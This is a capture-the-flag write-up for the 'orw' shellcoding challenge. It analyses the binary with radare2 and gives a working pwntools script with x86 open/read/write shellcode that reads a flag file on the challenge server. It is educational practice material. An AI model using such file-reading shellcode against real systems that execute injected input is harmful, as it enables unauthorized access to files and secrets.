---
title: ORW Pwnable.kr challenge writeup
author: kaki-epithesi
featured-img: bin-exp
categories: [Writeup,Binary Exploitation]
tags: [syscalls,assembly,pwntools]
---

Question Description

```py
orw [100 pts]

Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.

nc chall.pwnable.tw 10001

```

```bash
root@kali:~/rev/pwanable# ./orw
Give my your shellcode:ok
Segmentation fault
```

lets analyze binary with radare2

```bash
root@kali:~/rev/pwanable# r2 orw
 -- ♥ --
[0x080483d0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x080483d0]> afl
0x080483d0    1 33           entry0
0x080483a0    1 6            sym.imp.__libc_start_main
0x08048410    4 43           sym.deregister_tm_clones
0x08048440    4 53           sym.register_tm_clones
0x08048480    3 30           entry.fini0
0x080484a0    4 43   -> 40   entry.init0
0x08048600    1 2            sym.__libc_csu_fini
0x08048400    1 4            sym.__x86.get_pc_thunk.bx
0x08048604    1 20           sym._fini
0x080484cb    3 125          sym.orw_seccomp
0x080483b0    1 6            sym.imp.prctl
0x08048390    1 6            sym.imp.__stack_chk_fail
0x080485a0    4 93           sym.__libc_csu_init
0x08048548    1 81           main                                                                                                                                          
0x08048380    1 6            sym.imp.printf                                                                                                                                
0x08048370    1 6            sym.imp.read                                                                                                                                  
0x08048330    3 35           sym._init                                                                                                                                     
[0x080483d0]> s main
[0x08048548]> pdf
            ; DATA XREF from entry0 @ 0x80483e7                                                                                                                            
┌ 81: int main (int32_t arg_4h);                                                                                                                                           
│           ; var int32_t var_4h @ ebp-0x4                                                                                                                                 
│           ; arg int32_t arg_4h @ esp+0x24                                                                                                                                
│           0x08048548      8d4c2404       lea ecx, [arg_4h]                                                                                                               
│           0x0804854c      83e4f0         and esp, 0xfffffff0                                                                                                             
│           0x0804854f      ff71fc         push dword [ecx - 4]                                                                                                            
│           0x08048552      55             push ebp                                                                                                                        
│           0x08048553      89e5           mov ebp, esp                                                                                                                    
│           0x08048555      51             push ecx                                                                                                                        
│           0x08048556      83ec04         sub esp, 4
│           0x08048559      e86dffffff     call sym.orw_seccomp
│           0x0804855e      83ec0c         sub esp, 0xc
│           0x08048561      68a0860408     push str.Give_my_your_shellcode: ; 0x80486a0 ; "Give my your shellcode:" ; const char *format
│           0x08048566      e815feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804856b      83c410         add esp, 0x10
│           0x0804856e      83ec04         sub esp, 4
│           0x08048571      68c8000000     push 0xc8                   ; 200 ; size_t nbyte
│           0x08048576      6860a00408     push obj.shellcode          ; 0x804a060 ; void *buf
│           0x0804857b      6a00           push 0                      ; int fildes
│           0x0804857d      e8eefdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x08048582      83c410         add esp, 0x10
│           0x08048585      b860a00408     mov eax, obj.shellcode      ; 0x804a060
│           0x0804858a      ffd0           call eax
│           0x0804858c      b800000000     mov eax, 0
│           0x08048591      8b4dfc         mov ecx, dword [var_4h]
│           0x08048594      c9             leave
│           0x08048595      8d61fc         lea esp, [ecx - 4]
└           0x08048598      c3             ret
[0x08048548]> 
```
i got focus on these two lines

```bash
│           0x08048585      b860a00408     mov eax, obj.shellcode      ; 0x804a060
│           0x0804858a      ffd0           call eax
```

its demanding a shellcode and calling it .so easy.

but execve is disabled.

and also the question name and hint suggests, orw.

open read write.

only these 3 syscalls are allowed.

so i just wrote a simple shellcode and got the flag.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import remote,u32,asm

shellcode = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'), # Flag path
    'xor ecx, ecx', # flag
    'mov ebx, esp', # Buffer
    'mov eax, 0x5', # Open syscall number
    'int 0x80',

    'mov edx, 0x80', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, 0x3', # file descriptor
    'mov eax, 0x3', # Read syscall number
    'int 0x80',

    'mov edx, eax', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, 0x1', # file descriptor
    'mov eax, 0x4', # Write syscall number
    'int 0x80',
]))

r = remote('chall.pwnable.tw', 10001)
r.recvuntil("Give my your shellcode:")
r.sendline(shellcode)
print(r.recv().decode('utf-8'))
```
dont know about syscalls see the man pages.

(man 2 write)

(man 2 read)

(man 2 open)

need more explanation about the shellcode comment or contact.

```bash
root@kali:~/rev/pwanable# ./orw.py
[+] Opening connection to chall.pwnable.tw on port 10001: Done
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}

root@kali:~/rev/pwanable# 
```